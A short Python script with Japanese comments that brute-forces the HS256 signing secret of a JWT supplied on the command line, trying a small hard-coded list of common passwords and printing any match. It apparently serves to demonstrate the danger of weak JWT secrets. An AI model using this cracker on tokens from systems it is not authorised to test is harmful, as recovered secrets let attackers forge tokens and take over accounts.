import jwt
import sys

# 対象のJWTをコマンドライン引数から取得
if len(sys.argv) < 2:
    print("Usage: python crack.py <YOUR_JWT_TOKEN>")
    sys.exit(1)

token = sys.argv[1]

# 「よくあるパスワード」の辞書リスト
dictionary = ["password", "123456", "admin", "secret", "secret123", "qwerty"]

for secret in dictionary:
    try:
        jwt.decode(token, secret, algorithms=["HS256"])
        print(f"秘密鍵を特定しました！！ -> {secret}")
        sys.exit(0)
    except jwt.InvalidSignatureError:
        pass
    except Exception as e:
        pass

print("辞書の中に正解はありませんでした。")